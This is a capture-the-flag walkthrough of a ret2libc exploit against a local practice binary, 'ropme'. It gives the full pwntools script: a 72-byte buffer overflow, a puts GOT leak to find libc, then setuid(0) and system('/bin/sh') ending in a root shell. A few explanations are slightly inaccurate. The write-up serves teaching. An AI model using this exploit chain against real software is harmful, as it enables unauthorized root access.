0. Check what we are up against.
root@nidus:/git/challenges/ropme# pwn checksec --file=ropme
  [*] '/git/challenges/ropme/ropme'
      Arch:     amd64-64-little
      RELRO:    Partial RELRO
      Stack:    No canary found
      NX:       NX enabled
      PIE:      No PIE (0x400000)

Arch = Tells us it's a 64 ELF-executable.

RELRO = stands for ‘relocation read-only’ and this protection ensures that the global offset table (GOT) cannot
be overwritten. But in this case, it’s partial RELRO so the only pragmatic difference is that the BSS section
comes before the GOT. This prevents buffer overflows in global variables overwriting the GOT.

NX = The NX flag, if enabled at compile-time, indicates that a given memory region can be either readable
or executable but never both. Again this is a protection that makes it harder to execute arbitrary shellcode.


1. Run ropme in gdb (with gef extension) to find the rsp value where the program crashes.
Create a pattern, run the program and see where it crashes.

gef➤  pattern create 100
  [+] Generating a pattern of 100 bytes
  aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
  [+] Saved as '$_gef0'
gef➤  r
  Starting program: /git/challenges/ropme/ropme
  ROP me outside, how 'about dah?
  aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

  Program received signal SIGSEGV, Segmentation fault.


We find that the program ended on a return (ret);
   →   0x40066c <main+70>        ret

And where the RSP (stack point) is;
  0x00007fffffffdf18│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa\n"	 ← $rsp

Use 'pattern offset' to find the offset:
gef➤  pattern offset jaaaaaaakaaaaaaalaaaaaaamaaa
  [+] Searching 'jaaaaaaakaaaaaaalaaaaaaamaaa'
  [+] Found at offset 72 (big-endian search)

We can prove the offset with a simple POC where we insert 72*A and 8*B, resulting in only B's in the rsp.
root@nidus:/git/challenges/0xDiablos# python -c "print 'A'*72 + 'B'*8"
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

gef➤  r
  Starting program: /git/challenges/ropme/ropme
  ROP me outside, how 'about dah?
  AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB

  0x00007fffffffdf18│+0x0000: "BBBBBBBB\n"	 ← $rsp

The offset is 72, aka BUF_SIZE = 72. This is a memory leak that can be induced.


2. Look for a function with ropper:
gef➤  ropper --search "pop r?i"
  -- snip --
  0x00000000004006d3: pop rdi; ret;
  0x00000000004006d1: pop rsi; pop r15; ret;

"In 64 bit programming the first four registers used for passing parameters are rdi, rsi, rdx, and rcx, in that order."
https://trustfoundry.net/basic-rop-techniques-and-tricks/

The rdi address is of interest here, with this information we can start creating our skeleton exploit.

root@nidus:/git/challenges/ropme# cat exploit.py
  #!/usr/bin/python3

  from pwn import *
  p = gdb.debug('./ropme', 'b main')
  context(os='linux', arch='amd64')

  junk = 'A' * 72
  pop_rdi = p64(0x4006d3)


3. After the pop, we can to put something new on the register. Here we would want the global offset tables address.
Using objdump we can find the address of puts.

root@nidus:/git/challenges/ropme# objdump -D ropme | grep puts
  00000000004004e0 <puts@plt>:
    4004e0:	ff 25 32 0b 20 00    	jmpq   *0x200b32(%rip)        # 601018 <puts@GLIBC_2.2.5>

Edit the script and add both got_puts (0x601018) and plt_puts (0x4004e0).

root@nidus:/git/challenges/ropme# cat exploit.py
  #!/usr/bin/python3

  from pwn import *
  p = gdb.debug('./ropme', 'b main')
  context(os='linux', arch='amd64')

  junk = ('A' * 72).encode()  # encode converts from string into bytes
  pop_rdi = p64(0x4006d3)     # gdb
  got_puts = p64(0x601018)    # objdump
  plt_puts = p64(0x4004e0)    # objdump

  gadget_leak = pop_rdi + got_puts + plt_puts

  p.sendline(junk + gadget_leak)
  p.interactive()

The gadge_leak variable will pop got_puts into rdi (register that will be run first), return to rsp where plt_puts will be at.

If we run the program now we crash it and get a random memory address printed.
root@nidus:/git/challenges/ropme# python3 exploit.py
  [+] Starting local process '/usr/bin/gdbserver': pid 58626
  [*] running in new terminal: /usr/bin/gdb -q  "./ropme" -x /tmp/pwnwnkf7s6s.gdb
  [*] Switching to interactive mode
  ROP me outside, how 'about dah?
  \xb0֩lc\x7f                                           <----- RANDOM MEMORY ADDRESS
  [*] Got EOF while reading in interactive

root@nidus:/git/challenges/ropme# python3 exploit.py
  [+] Starting local process '/usr/bin/gdbserver': pid 58786
  [*] running in new terminal: /usr/bin/gdb -q  "./ropme" -x /tmp/pwn26khpzjk.gdb
  [*] Switching to interactive mode
  ROP me outside, how 'about dah?
  \xb0\x06\x13\x7f                                     <----- RANDOM MEMORY ADDRESS
  [*] Got EOF while reading in interactive

To get some value of that random memory address we can print the leaked value as 8 bytes.
Edit the last lines of the script to look like below and run the script again.
  p.sendline(junk + gadget_leak)
  p.recvuntil("ROP me outside, how 'about dah?")
  leaked_put = p.recv()[:8]
  log.info(f'Leaked Address: {leaked_put}')
  p.interactive()

root@nidus:/git/challenges/ropme# python3 exploit.py
  -- snip --
  [*] Leaked Address: b'\n\xb0&g\xb5\x14\x7f\n'

The memory address is now in 8 byte format, and ends with a new line (\n). However notice that like the example above
all of the 8 bytes were not filled, to fix this we can adjust the output to always print 8 bytes - thus giving us a
valid memory address in the end.

Change leaked_puts:
leaked_put = p.recv()[:8].strip().ljust(8, b'\x00')

root@nidus:/git/challenges/ropme# python3 exploit.py
  -- snip --
  [*] Leaked Address: b'\xb0\xc60|%\x7f\x00\x00'

As we see the output is now 8 bytes long and the 'padding' is null bytes. To get it more human readable convert the
output to hex, which is easily done by adding .hex() to the log.info line as below.
  log.info(f'Leaked Address: {leaked_put.hex()}')

root@nidus:/git/challenges/ropme# python3 exploit.py
  -- snip --
  [*] Leaked Address: b046c66e907f0000

As we can see we now get a human readable leaked memory address, however the string is in reverse (because of
how little endian works).


4. Next we need to make sure that the program doesn't crash. To do this we grab the address of main via objdump.
root@nidus:/git/challenges/ropme# objdump -D ropme | grep main
  -- snip --
  0000000000400626 <main>:

Edit the script and add plt_main:

root@nidus:/git/challenges/ropme# cat exploit.py
  #!/usr/bin/python3

  from pwn import *
  p = gdb.debug('./ropme', 'b main')
  context(os='linux', arch='amd64')

  junk = ('A' * 72).encode()
  pop_rdi = p64(0x4006d3)     # gdb
  got_puts = p64(0x601018)    # objdump
  plt_puts = p64(0x4004e0)    # objdump
  plt_main = p64(0x400626)    # objdump

  gadget_leak = pop_rdi + got_puts + plt_puts + plt_main

  p.sendline(junk + gadget_leak)
  p.recvuntil("ROP me outside, how 'about dah?")
  leaked_put = p.recv()[:8].strip().ljust(8, b'\x00')
  log.info(f'Leaked Address: {leaked_put.hex()}')
  p.interactive()


5. Now we're back at the beginning. We've leaked the address of puts from within libc, and continue to run the program.
Next we need to find where libc is.

root@nidus:/git/challenges/ropme# ldd ropme
	-- snip --
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4e287e8000)

root@nidus:/git/challenges/ropme# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
   -- snip --
   430: 00000000000766b0   472 FUNC    WEAK   DEFAULT   14 puts@@GLIBC_2.2.5

root@nidus:/git/challenges/ropme# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
 1429: 0000000000048f20    45 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.2.5

root@nidus:/git/challenges/ropme# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid
   25: 00000000000cc220   144 FUNC    WEAK   DEFAULT   14 setuid@@GLIBC_2.2.5

And lastly we need an argument to system, else it will crash. So to do that we use strings.
root@nidus:/git/challenges/ropme# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 18a156 /bin/sh

Add all your variables to the code to look like this:
root@nidus:/git/challenges/ropme# cat exploit.py
  -- snip --
  junk = ('A' * 72).encode()
  pop_rdi = p64(0x4006d3)     # gdb ropper
  got_puts = p64(0x601018)    # objdump
  plt_puts = p64(0x4004e0)    # objdump
  plt_main = p64(0x400626)    # objdump
  libc_puts = p64(0x766b0)    # readelf
  libc_system = p64(0x48f20)  # readelf
  libc_setuid = p64(0xcc220)  # readelf
  libc_sh = p64(0x18a156)     # strings


6. Continue the coding by calculating the offset and print the information.
root@nidus:/git/challenges/ropme# cat exploit.py
  #!/usr/bin/python3

  from pwn import *
  p = gdb.debug('./ropme', 'b main')
  context(os='linux', arch='amd64')

  junk = ('A' * 72).encode()
  pop_rdi = p64(0x4006d3)     # gdb ropper
  got_puts = p64(0x601018)    # objdump
  plt_puts = p64(0x4004e0)    # objdump
  plt_main = p64(0x400626)    # objdump
  libc_puts = p64(0x766b0)    # readelf
  libc_system = p64(0x48f20)  # readelf
  libc_setuid = p64(0xcc220)  # readelf
  libc_sh = p64(0x18a156)     # strings

  gadget_leak = pop_rdi + got_puts + plt_puts + plt_main

  p.sendline(junk + gadget_leak)
  p.recvuntil("ROP me outside, how 'about dah?")
  leaked_put = p.recv()[:8].strip().ljust(8, b'\x00')
  log.info(f'Leaked Address: {leaked_put.hex()}')

  offset = u64(leaked_put) - u64(libc_puts)
  log.info(f'Offset: {offset}')

  system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
  setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
  sh_loc = (u64(libc_sh) + offset).to_bytes(8, byteorder='little')

  log.info(f'System Location: {system_loc.hex()}')
  log.info(f'SetUID Location: {setuid_loc.hex()}')
  log.info(f'/bin/sh Location: {sh_loc.hex()}')

  p.interactive()


7. Create your gadged chain (exploit).

root@nidus:/git/challenges/ropme# cat exploit.py
  #!/usr/bin/python3

  from pwn import *
  p = gdb.debug('./ropme', 'b main')
  context(os='linux', arch='amd64')

  junk = ('A' * 72).encode()
  pop_rdi = p64(0x4006d3)     # gdb ropper
  got_puts = p64(0x601018)    # objdump
  plt_puts = p64(0x4004e0)    # objdump
  plt_main = p64(0x400626)    # objdump
  libc_puts = p64(0x766b0)    # readelf
  libc_system = p64(0x48f20)  # readelf
  libc_setuid = p64(0xcc220)  # readelf
  libc_sh = p64(0x18a156)     # strings

  # Gadget to leak
  gadget_leak = pop_rdi + got_puts + plt_puts + plt_main

  p.sendline(junk + gadget_leak)
  p.recvuntil("ROP me outside, how 'about dah?")
  leaked_put = p.recv()[:8].strip().ljust(8, b'\x00')
  log.info(f'Leaked Address: {leaked_put.hex()}')

  offset = u64(leaked_put) - u64(libc_puts)
  log.info(f'Offset: {offset}')

  system_loc = (u64(libc_system) + offset).to_bytes(8, byteorder='little')
  setuid_loc = (u64(libc_setuid) + offset).to_bytes(8, byteorder='little')
  sh_loc = (u64(libc_sh) + offset).to_bytes(8, byteorder='little')

  log.info(f'System Location: {system_loc.hex()}')
  log.info(f'SetUID Location: {setuid_loc.hex()}')
  log.info(f'/bin/sh Location: {sh_loc.hex()}')

  #Gadget to Code Exec
  gadget_rce = pop_rdi + p64(0) + setuid_loc      # pops rdi, puts 0 into rdi and calls setuid. SetUID sees that value 0, aka root
  gadget_rce += pop_rdi + sh_loc + system_loc     # pops rdi, puts /bin/sh in it and calls system, giving us a root shell

  p.sendline(junk + gadget_rce)
  p.interactive()


Test the exploit:
root@nidus:/git/challenges/ropme# python3 exploit.py
  [+] Starting local process '/usr/bin/gdbserver': pid 63204
  [*] running in new terminal: /usr/bin/gdb -q  "./ropme" -x /tmp/pwniup9y8jz.gdb
  [*] Leaked Address: b0e64c3c1f7f0000
  [*] Offset: 139772131901440
  [*] System Location: 200f4a3c1f7f0000
  [*] SetUID Location: 2042523c1f7f0000
  [*] /bin/sh Location: 56215e3c1f7f0000
  [*] Switching to interactive mode
  ROP me outside, how 'about dah?
  Detaching from process 63228
  $ pwd
  /git/challenges/ropme
  $ whoami
  root

We now have a successful root shell within the program.
